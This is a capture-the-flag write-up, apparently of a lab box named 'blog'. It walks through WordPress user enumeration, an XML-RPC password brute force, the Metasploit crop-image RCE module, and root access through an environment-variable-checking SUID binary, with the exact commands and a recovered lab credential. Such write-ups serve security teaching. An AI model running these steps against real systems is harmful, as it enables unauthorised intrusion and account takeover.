# blog

**Status:** Completed
**Target:** `$TARGET`
**OS:** Linux
**Difficulty:** Medium

## Recon
```bash
nmap -sS -p- -n -Pn --min-rate 5000 --open $TARGET -oN silent
nmap -sVC -p22,80,139,445 $TARGET -oN service 
```

### WordPress user enumeration with wpscan
```bash
wpscan --url http://blog.thm --enumerate u
```
**Output**
```

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
```
### XML-RPC brute force attack
```bash
wpscan --url http://blog.thm --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/rockyou.txt -t 50
```
**Output**
```
[SUCCESS] - kwheel / cutiepie1                                                              
```

### No admin privileges, but WordPress 5.0 is outdated — crop-image RCE
```bash
msfconsole 
search crop-image
use exploit/multi/http/wp_crop_rce
set RHOSTS , LHOST , VHOST , PASSWORD , USERNAME
run
shell
```
### Linux Enumeration
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
find / -perm -4000 -type f 2>/dev/null
```
**Output**
```
/usr/sbin/checker
```

### The `checker` SUID binary — reverse engineering with Ghidra

Using msfconsole to download the binary and Ghidra for analysis:

```
{
  char *pcVar1;
  
  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
```
### The binary checks the `admin` environment variable — if set, it grants SUID 0 (root) to the bash process
```bash
export admin=admin
/usr/sbin/checker
cat /root/root.txt
find / -type f -name "user.txt"
cat /media/usb/user.txt
```
## Related Notes

- [wpscan](../../../tools/web/wpscan.md)
- [metasploit](../../../tools/exploitation/metasploit.md)
- [WordPress crop-image RCE](../../../exploits/web-rce/wordpress-crop-image-rce.md)
- [SUID env-var checker privesc](../../../exploits/privesc-linux/suid-env-var-checker.md)
- [Python PTY stabilization](../../../payloads/shell-stabilization/python-pty.md)
